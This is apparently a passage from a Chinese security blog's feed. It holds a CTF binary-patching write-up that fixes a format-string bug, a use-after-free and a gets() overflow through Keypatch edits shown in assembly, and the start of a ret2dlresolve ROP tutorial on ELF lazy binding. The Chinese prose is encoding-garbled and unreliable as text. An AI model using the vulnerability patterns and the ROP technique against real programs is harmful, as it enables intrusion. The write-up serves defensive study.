<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000000DEF call    read</span><br><span class="line">.text:0000000000000DF4 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000000DF8 mov     rsi, rax        </span><br><span class="line">.text:0000000000000DFB mov     edi, offset unk_1 ; s</span><br><span class="line">.text:0000000000000E00 mov     eax, 0</span><br><span class="line">.text:0000000000000E05 call    __printf_chk</span><br><span class="line">.text:0000000000000E0A lea     rdi, aPleaseInputYou ; &quot;Please input your</span><br></pre></td></tr></table></figure></div>

<p>patchå</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000000DEF call    read</span><br><span class="line">.text:0000000000000DF4 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000000DF8 mov     rdi, rax        ; Keypatch modified this from:</span><br><span class="line">.text:0000000000000DF8                         ;   mov rsi, rax</span><br><span class="line">.text:0000000000000DFB nop                     ; s</span><br><span class="line">.text:0000000000000DFB                         ; Keypatch modified this from:</span><br><span class="line">.text:0000000000000DFB                         ;   mov edi, offset unk_1</span><br><span class="line">.text:0000000000000DFB                         ; Keypatch padded NOP to next boundary: 4 bytes</span><br><span class="line">.text:0000000000000DFC nop</span><br><span class="line">.text:0000000000000DFD nop</span><br><span class="line">.text:0000000000000DFE nop</span><br><span class="line">.text:0000000000000DFF nop</span><br><span class="line">.text:0000000000000E00 mov     eax, 0</span><br><span class="line">.text:0000000000000E05 call    puts            ; Keypatch modified this from:</span><br><span class="line">.text:0000000000000E05                         ;   call __printf_chk</span><br><span class="line">.text:0000000000000E0A lea     rdi, aPleaseInputYou ; &quot;Please input you</span><br></pre></td></tr></table></figure></div>

<p>åç¼–è¯‘ç»“æœï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20190614190117757.png"
                      alt="image-20190614190117757"
                ></p>
<p>psï¼šæŸäº›æƒ…å†µä¸‹ç¨‹åºä¸­å¯èƒ½æ²¡æœ‰ puts å‡½æ•°ï¼Œæ­¤æ—¶éœ€è¦å¯¹ printf å‡½æ•°è¿›è¡Œä¸€å®šç¨‹åº¦çš„ä¿®æ”¹ï¼Œåœ¨çœŸæ­£è¾“å‡ºå­—ç¬¦ä¸²ä¹‹å‰å…ˆè¿‡æ»¤ï¼Œå»æ‰éæ³•å­—ç¬¦ä¸²(ä¾‹å¦‚ %p ç­‰)ï¼Œå¦‚ä½• patch å‚è€ƒä¸‹é¢çš„å†…å®¹ã€‚</p>
<p><strong>Patch2:</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the index:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[<span class="number">2</span> * v1]);                     <span class="comment">// uaf</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ˜¯ä¸€ä¸ª UAF æ¼æ´ï¼Œå †å—æŒ‡é’ˆä¿å­˜åœ¨å…¨å±€æ•°ç»„ä¸­ï¼Œä½†æ˜¯ free çš„æ—¶å€™æ²¡æœ‰æ¸…é™¤æŒ‡é’ˆï¼Œå¯¼è‡´ UAFã€‚</p>
<p>patch è¿™ç§æ¼æ´å°±ä¸èƒ½ç›´æ¥åœ¨åŸæ¥çš„ä»£ç åŸºç¡€ä¸Šä¿®æ”¹äº†ï¼Œå› ä¸ºç›´æ¥æ·»åŠ ä»£ç ä¼šå¯¼è‡´æŒ‡ä»¤è¢«è¦†ç›–ï¼Œç ´åç¨‹åºçš„æ­£å¸¸åŠŸèƒ½ã€‚</p>
<p>è¿™é‡Œç”¨åˆ°ä¸Šé¢æåˆ°çš„æŠ€å·§ï¼Œé€šè¿‡ä¿®æ”¹ call æŒ‡ä»¤åŠ«æŒç¨‹åºçš„æ§åˆ¶æµåˆ° .eh_frame æ®µå³æ·»åŠ çš„ fix ä»£ç å¤„ï¼Œå¯¹ chunk_list æ‰§è¡Œæ¸…ç©ºæ“ä½œï¼Œç„¶åæ­£å¸¸è°ƒç”¨ free å‡½æ•°å®Œæˆç¨‹åºåŠŸèƒ½ï¼Œæœ€åé€šè¿‡å¼ºåˆ¶è·³è½¬æŒ‡ä»¤å›åˆ°æ­£å¸¸çš„æ§åˆ¶æµã€‚</p>
<p>patchå‰ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000000D79 lea     rax, chunk_list</span><br><span class="line">.text:0000000000000D80 mov     rax, [rdx+rax]</span><br><span class="line">.text:0000000000000D84 mov     rdi, rax        ; ptr</span><br><span class="line">.text:0000000000000D87 call    free</span><br><span class="line">.text:0000000000000D8C lea     rdi, aDone      ; &quot;Done!&quot;</span><br><span class="line">.text:0000000000000D93 call    p</span><br></pre></td></tr></table></figure></div>

<p>Patchå(åœ¨ .eh_frame æ®µæ·»åŠ äº†ä»£ç )ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eh_frame:00000000000011F9 ; START OF FUNCTION CHUNK FOR delete</span><br><span class="line">.eh_frame:00000000000011F9</span><br><span class="line">.eh_frame:00000000000011F9 loc_11F9:                               ; CODE XREF: delete+55â†‘j</span><br><span class="line">.eh_frame:00000000000011F9                 lea     rax, chunk_list</span><br><span class="line">.eh_frame:0000000000001200                 mov     rax, [rdx+rax]  ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000001200                                         ;   add [rdx+52h], edi</span><br><span class="line">.eh_frame:0000000000001200                                         ; Keypatch padded NOP to next boundary: 2 bytes</span><br><span class="line">.eh_frame:0000000000001200                                         ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000001200                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001200                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001200                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001200                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001204                 mov     qword ptr [rax], 0 ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000001204                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001204                                         ;   js short loc_1217</span><br><span class="line">.eh_frame:0000000000001204                                         ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000001204                                         ;   mov r9, rax</span><br><span class="line">.eh_frame:0000000000001204                                         ; Keypatch padded NOP to next boundary: 2 bytes</span><br><span class="line">.eh_frame:0000000000001204                                         ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000001204                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001204                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001204                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001204                                         ;   add [rbx], ebx</span><br><span class="line">.eh_frame:0000000000001204                                         ;   or al, 7</span><br><span class="line">.eh_frame:000000000000120B                 call    free            ; Keypatch modified this from:</span><br><span class="line">.eh_frame:000000000000120B                                         ;   or [rax+24000001h], dl</span><br><span class="line">.eh_frame:000000000000120B                                         ; Keypatch padded NOP to next boundary: 1 bytes</span><br><span class="line">.eh_frame:0000000000001210                 jmp     loc_D8C         ; Keypatch modified this from:</span><br></pre></td></tr></table></figure></div>

<p>patch ååç¼–è¯‘</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the index:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  v0 = <span class="number">2LL</span> * v3;</span><br><span class="line">  v1 = chunk_list[v0];</span><br><span class="line">  *chunk_list[v0] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">free</span>(v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>Patch3:</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts(&quot;Input your Plaintext to be encrypted&quot;);</span><br><span class="line">gets(s);</span><br></pre></td></tr></table></figure></div>

<p>gets æ ˆæº¢å‡ºï¼Œå¦‚æ³•ç‚®åˆ¶ï¼Œä¿®æ”¹ call gets æŒ‡ä»¤åŠ«æŒæ§åˆ¶æµåˆ° .eh_frame æ®µã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæ­¤ç¨‹åºä¸­åªæœ‰ gets å‡½æ•°èƒ½å¤Ÿæ¥å—ç”¨æˆ·è¾“å…¥ï¼Œéš¾é“å°±æ— æ³• patch äº†å—ï¼Ÿ</p>
<p>å…¶å®ä¸ç„¶ï¼Œå› ä¸ºè¿˜æœ‰ syscall å¯ä»¥ä½¿ç”¨ï¼Œé€šè¿‡ syscall æ„é€  read å‡½æ•°ï¼Œå°±èƒ½æ§åˆ¶è¾“å…¥æ•°æ®çš„é•¿åº¦ï¼Œå®Œæˆä¿®å¤ã€‚</p>
<p>patch å‰ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004009D1 lea     rax, [rbp+s]</span><br><span class="line">.text:00000000004009D5 mov     rdi, rax</span><br><span class="line">.text:00000000004009D8 mov     eax, 0</span><br><span class="line">.text:00000000004009DD call    _gets</span><br><span class="line">.text:00000000004009E2 jmp     loc_40</span><br></pre></td></tr></table></figure></div>

<p>patch åï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eh_frame:0000000000400F7D ; START OF FUNCTION CHUNK FOR encrypt</span><br><span class="line">.eh_frame:0000000000400F7D</span><br><span class="line">.eh_frame:0000000000400F7D loc_400F7D:             ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F7D mov     rax, 3          ;   db 0</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F7D                         ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   mov eax, 3</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0BBh</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84 mov     rbx, 0          ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 14h</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8B mov     rcx, rdi        ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F8B                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8B                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8B                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8E mov     rdx, 40h        ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 1</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 7Ah</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 52h</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 1</span><br><span class="line">.eh_frame:0000000000400F95 syscall                 ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F95                         ;   js short loc_400FA7</span><br><span class="line">.eh_frame:0000000000400F95                         ;   add [rbx], ebx</span><br><span class="line">.eh_frame:0000000000400F95                         ;   or al, 7</span><br><span class="line">.eh_frame:0000000000400F95                         ; Keypatch padded NOP to next boundary: 1 bytes</span><br><span class="line">.eh_frame:0000000000400F95                         ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F95                         ;   jmp loc_400AB4</span><br><span class="line">.eh_frame:0000000000400F95                         ; Keypatch padded NOP to next boundary: 3 bytes</span><br><span class="line">.eh_frame:0000000000400F97 jmp     loc_400AB4      ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F97 ; END OF FUNCTION CHUNK FOR encrypt ;   nop</span><br></pre></td></tr></table></figure></div>

<p>åç¼–è¯‘ä»£ç ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts(&quot;Input your Plaintext to be encrypted&quot;);</span><br><span class="line"> __asm &#123; syscall; Keypatch modified this from: &#125;  // read</span><br></pre></td></tr></table></figure></div>



<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Patch binary çš„æ—¶å€™è¦æ³¨æ„ä¸èƒ½ä½¿æ–‡ä»¶ä½“ç§¯å˜åŠ¨è¿‡å¤§ï¼Œå¦åˆ™å¾ˆå®¹æ˜“è¢«åˆ¤å®•æœºï¼Œå¦å¤–ï¼Œé’ˆå¯¹ä¸åŒçš„æ¼æ´æœ‰ä¸åŒçš„ä¿®å¤æ‰‹æ®µï¼Œä½†æ˜¯æ€»ä½“ä¸Šæ¥çœ‹å°±æ˜¯æ·»åŠ ã€åˆ é™¤ä»£ç çš„è¿‡ç¨‹ã€‚patch è¿‡ç¨‹ä¸­æ³¨æ„ä¸è¦ç ´ååŸæœ‰çš„åŠŸèƒ½ï¼ˆç‰¹åˆ«æ˜¯å †æ ˆã€å¯„å­˜å™¨ç­‰è¿è¡Œç¯å¢ƒï¼‰ï¼Œé˜²æ­¢ check ä¸è¿‡ï¼Œå½“é‡åˆ°æ¯”è¾ƒå¤æ‚çš„æ¼æ´æˆ–è€…æ–‡ä»¶ç©ºé—´ä¸è¶³ç­‰æƒ…å†µï¼Œåº”è¯¥è€ƒè™‘ä½¿ç”¨å¦‚ LIEF ç­‰å·¥å…·ç›´æ¥æ›¿æ¢æ•´ä¸ªå‡½æ•°ã€‚</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Ret2 runtime_dlresolve</title>
    <url>/2019/05/02/Ret2runtime_dlresolve/</url>
    <content><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Ret2dlresolve æ˜¯é«˜çº§ ROP æŠ€å·§ä¹‹ä¸€ï¼Œä¸–ç•Œè‘—åçš„é»‘å®¢æ‚å¿— phrack åœ¨æŸä¸€æœŸæåˆ°è¿‡è¿™ä¸ªæ”»å‡»æŠ€å·§ï¼Œè¯¥æ‰‹æ®µç”¨äºæ²¡æœ‰è¾ƒå¥½çš„ gadgetã€å‡½æ•°ã€åˆ©ç”¨é“¾çš„æƒ…å†µã€‚ret2dlresolve ä¸»è¦åˆ©ç”¨äº† linux ä¸‹çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œé€šè¿‡ä¿®æ”¹è§£æå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶æœ€ç»ˆè§£æå‡ºçš„å‡½æ•°ï¼Œä»è€Œè·å–ä»»æ„å‡½æ•°æ‰§è¡Œçš„èƒ½åŠ›ã€‚</p>
<span id="more"></span>

<h2 id="å»¶è¿Ÿç»‘å®š"><a href="#å»¶è¿Ÿç»‘å®š" class="headerlink" title="å»¶è¿Ÿç»‘å®š"></a>å»¶è¿Ÿç»‘å®š</h2><p>è¿™ä¸€æ”»å‡»æŠ€å·§çš„åŸºç¡€å°±æ˜¯linuxä¸‹çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæ‰€ä»¥é¦–å…ˆæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯å»¶è¿Ÿç»‘å®šã€‚</p>
<p>ç¨‹åºå‘˜ç¼–å†™ä¸€ä¸ªç¨‹åºä¼šå¯¼å…¥å„ç§å„æ ·çš„å‡½æ•°ï¼Œä¾‹å¦‚æˆ‘ä»¬ç¼–å†™ä¸€ä¸ª hello world Cè¯­è¨€ç¨‹åº</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç¨‹åºå‘˜åªç¼–å†™äº†ä¸¤å¥æœ‰æ„ä¹‰çš„ä»£ç ï¼Œå…¶ä¸­ printf å‡½æ•°ä¸æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„ï¼Œè€Œæ˜¯ä» Cè¯­è¨€æ ‡å‡†åº“ä¸­å¯¼å…¥çš„ã€‚å½“å¼€å‘ä¸€ä¸ªå¤§å‹é¡¹ç›®çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šä»æ ‡å‡†åº“ä¸­å¯¼å…¥å¾ˆå¤šå‡½æ•°ï¼Œè€ŒæŸäº›å‡½æ•°å¯èƒ½ä»æ¥éƒ½ä¸ä¼šè¢«è°ƒç”¨ï¼Œä¸ºäº†å¢åŠ ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ï¼Œlinux å¼•å…¥çš„å»¶è¿Ÿç»‘å®šè¿™ä¸€æ¦‚å¿µï¼Œå½“ç¨‹åºç¬¬ä¸€æ¬¡è°ƒç”¨å¯¼å…¥å‡½æ•°çš„æ—¶å€™æ‰å» libc ä¸­å¯»æ‰¾å¯¹åº”çš„åœ°å€ï¼Œå¹¶å°†åœ°å€å†™å…¥ GOT è¡¨ä¸­ï¼Œé‚£äº›æ²¡æœ‰è¢«è°ƒç”¨çš„å‡½æ•°å°±ä¸ç»‘å®šã€‚å·²ç»ç»‘å®šçš„å‡½æ•°å†æ¬¡è°ƒç”¨åˆ™ç›´æ¥å» GOT è¡¨ä¸­å¯»æ‰¾å°±å¥½äº†ã€‚</p>
<p>å®ç°å»¶è¿Ÿç»‘å®šçš„ä¸»è¦å‡½æ•°æ˜¯ _dl_runtime_resolveï¼Œå®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ linkmap å’Œ offsetï¼Œè¿™ä¸ªå‡½æ•°æˆ‘ä»¬æ”¾åœ¨ä¸‹é¢è®²ï¼Œé¦–å…ˆæ¥äº†è§£ä¸€ä¸‹ ELF çš„æ ¼å¼ä¿¡æ¯ã€‚</p>
<h2 id="ELF-dynamic-èŠ‚"><a href="#ELF-dynamic-èŠ‚" class="headerlink" title="ELF .dynamic èŠ‚"></a>ELF .dynamic èŠ‚</h2><p>è¿™ä¸ªèŠ‚åŒ…å«å…³äºåŠ¨æ€é“¾æ¥çš„ä¿¡æ¯ï¼ŒPE æˆ–è€… ELF åœ¨è¿è¡Œç¨‹åºçš„æ—¶å€™éƒ½éœ€è¦è¿›è¡ŒåŠ¨æ€é“¾æ¥ï¼Œå› ä¸ºæºä»£ç ä¸­å¯èƒ½è°ƒç”¨äº†åŠ¨æ€åº“ä¸­çš„ä¸€äº›å‡½æ•°ï¼Œå¼•ç”¨å…¶ä»–ç¨‹åºä»£ç æ—¶ï¼Œåœ¨ç¼–è¯‘æˆ–è€…é“¾æ¥é˜¶æ®µä¸èƒ½ç¡®å®šåœ°å€åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œå› ä¸ºå½“ç¨‹åºåŠ è½½åˆ°å†…å­˜ä¹‹ååœ°å€éƒ½æ˜¯åŠ¨æ€çš„ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°è¿›è¡Œåœ°å€å®šä½ã€‚</p>
<p>.dynamic èŠ‚åœ¨åŠ¨æ€é“¾æ¥çš„ ELF æ–‡ä»¶ä¸­å¤§åŒå°å¼‚ï¼Œç»“æ„ä¸€èˆ¬å¦‚ä¸‹(ä» IDA ä¸­çœ‹)</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:08049F14 ; ELF Dynamic Information</span><br><span class="line">LOAD:08049F14 ; ===========================================================================</span><br><span class="line">LOAD:08049F14</span><br><span class="line">LOAD:08049F14 ; Segment type: Pure data</span><br><span class="line">LOAD:08049F14 ; Segment permissions: Read/Write</span><br><span class="line">LOAD:08049F14 LOAD            segment mempage public &#x27;DATA&#x27; use32</span><br><span class="line">LOAD:08049F14                 assume cs:LOAD</span><br><span class="line">LOAD:08049F14                 ;org 8049F14h</span><br><span class="line">LOAD:08049F14 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BCâ†‘o</span><br><span class="line">LOAD:08049F14                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_â†“o</span><br><span class="line">LOAD:08049F14                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C                 Elf32_Dyn &lt;0Ch, &lt;80482CCh&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:08049F24                 Elf32_Dyn &lt;0Dh, &lt;8048524h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:08049F2C                 Elf32_Dyn &lt;19h, &lt;8049F0Ch&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:08049F34                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C                 Elf32_Dyn &lt;1Ah, &lt;8049F10h&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C                 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54                 Elf32_Dyn &lt;5, &lt;804822Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C                 Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64                 Elf32_Dyn &lt;0Ah, &lt;51h&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049F74                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C                 Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84                 Elf32_Dyn &lt;2, &lt;18h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049F94                 Elf32_Dyn &lt;17h, &lt;80482B4h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C                 Elf32_Dyn &lt;11h, &lt;80482ACh&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049FA4                 Elf32_Dyn &lt;12h, &lt;8&gt;&gt;    ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049FB4                 Elf32_Dyn &lt;6FFFFFFEh, &lt;804828Ch&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4                 Elf32_Dyn &lt;6FFFFFF0h, &lt;804827Eh&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure></div>

<p>é‡Œé¢åŒ…å«è®¸å¤šå­èŠ‚ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ DT_STRTABã€DT_SYMTABã€DT_JMPRELï¼Œè¿™ä¸‰é¡¹ï¼Œä»–ä»¬æ˜¯æŒ‡å‘å…¶ä»–èŠ‚çš„æŒ‡é’ˆï¼ŒDT_STRTAB æŒ‡å‘ .dynstrï¼ŒDT_SYMTAB æŒ‡å‘ .dynsymï¼ŒDT_JMPREL æŒ‡å‘ .rel.pltã€‚</p>
<h2 id="rel-plt-èŠ‚"><a href="#rel-plt-èŠ‚" class="headerlink" title=".rel.plt èŠ‚"></a>.rel.plt èŠ‚</h2><p>ä» IDA ä¸­ï¼Œè¿™ä¸ªèŠ‚çš„ç»“æ„ä¸º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:080482B4 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:080482B4                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:080482BC                 Elf32_Rel &lt;804A010h, 207h&gt; ; R_386_JMP_SLOT memcpy</span><br><span class="line">LOAD:080482C4                 Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:080482C4 LOAD            ends</span><br></pre></td></tr></table></figure></div>

<p>æ¯ä¸€è¡Œéƒ½æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œç»“æ„ä½“å®šä¹‰ä¸º</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//æŒ‡å‘GOTè¡¨çš„æŒ‡é’ˆ</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯æŒ‡å‘ GOT è¡¨çš„æŒ‡é’ˆï¼Œç¬¬äºŒä¸ªæˆå‘˜æ˜¯ .dynsym èŠ‚çš„åç§»ã€‚</p>
<h2 id="dynsym-èŠ‚"><a href="#dynsym-èŠ‚" class="headerlink" title=".dynsym èŠ‚"></a>.dynsym èŠ‚</h2><p>ä» IDA ä¸­æ¥çœ‹ï¼Œè¿™ä¸ªèŠ‚çš„ç»“æ„å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:080481CC ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;offset aRead - offset byte_804822C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aMemcpy - offset byte_804822C, 0, 0, 12h, 0, 0&gt; ; &quot;memcpy&quot;</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804822C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804822C, 0, 0, 12h, 0, \ ; 